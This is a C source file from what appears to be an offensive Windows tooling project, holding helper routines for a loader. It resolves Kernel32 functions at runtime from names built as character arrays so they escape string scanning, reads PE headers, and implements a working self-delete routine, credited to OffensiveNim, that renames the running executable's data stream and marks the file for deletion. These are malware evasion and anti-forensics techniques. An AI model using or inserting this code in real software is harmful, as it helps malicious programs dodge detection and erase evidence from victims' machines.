#include "utilities.h"

HMODULE customLoadLibrary(LPCWSTR library) {
	//loadLibrary strings.
	WCHAR strKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };
	unsigned char strLoadLibraryW[] = { 'L','o','a','d','L','i','b','r','a','r','y','W',0x0 };
	//dynamically resolve the loadlibrary function
	t_LoadLibraryW pLoadLibraryW = (t_LoadLibraryW)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strLoadLibraryW);

	return pLoadLibraryW(library);
}

SIZE_T getImageSize(DWORD_PTR imageBase) {
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
	SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

	return imageSize;
}

PIMAGE_NT_HEADERS getNtHeaders(DWORD_PTR imageBase) {
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
	return ntHeaders;
}


//implemneted in nim here: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/self_delete_bin.nim#L32
//implemented in C below:

void selfDelete() {
	WCHAR strK32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };

	char strCloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0x0 };
	char strSetFileInformationByHandle[] = { 'S','e','t','F','i','l','e','I','n','f','o','r','m','a','t','i','o','n','B','y','H','a','n','d','l','e',0x0 };
	char strCreateFileW[] = { 'C','r','e','a','t','e','F','i','l','e','W',0x0 };
	char strGetModuleFileName[] = { 'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','W',0x0 };

	t_CloseHandle pCloseHandle = (t_CloseHandle)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strCloseHandle);
	t_SetFileInformationByHandle pSetFileInformationByhandle = (t_SetFileInformationByHandle)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strSetFileInformationByHandle);
	t_CreateFileW pCreateFileW = (t_CreateFileW)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strCreateFileW);
	t_GetModuleFileNameW pGetModuleFileNameW = (t_GetModuleFileNameW)hlpGetProcAddress(hlpGetModuleHandle(strK32dll), strGetModuleFileName);

	BOOL result = NULL;
	WCHAR path[260] = { 0 };
	DWORD outSize = 260;
	pGetModuleFileNameW(NULL, path, outSize);

	HANDLE currFileHandle = pCreateFileW(path, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (!currFileHandle) {
		exit(-69);
	}
	FILE_RENAME_INFO reNameInfo = { 0 };
	WCHAR reName[260] = {':','b','r','e','a','d','m','a','n',0x0};
	reNameInfo.FileNameLength = wcslen(reName) * sizeof(WCHAR);
	lstrcatW(reNameInfo.FileName, reName);
	reNameInfo.ReplaceIfExists = TRUE;
	result = pSetFileInformationByhandle(currFileHandle, FileRenameInfo, (LPVOID)&reNameInfo, sizeof(reNameInfo));
	if(!result)
		exit(-70);

	pCloseHandle(currFileHandle);

	currFileHandle = pCreateFileW(path, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (!currFileHandle) {
		exit(-71);
	}

	FILE_DISPOSITION_INFO dispositionInfo = { 0 };
	dispositionInfo.DeleteFileW = TRUE;
	if (!pSetFileInformationByhandle(currFileHandle, FileDispositionInfo, &dispositionInfo, sizeof(dispositionInfo))) {
		exit(-72);
	}
	pCloseHandle(currFileHandle);

}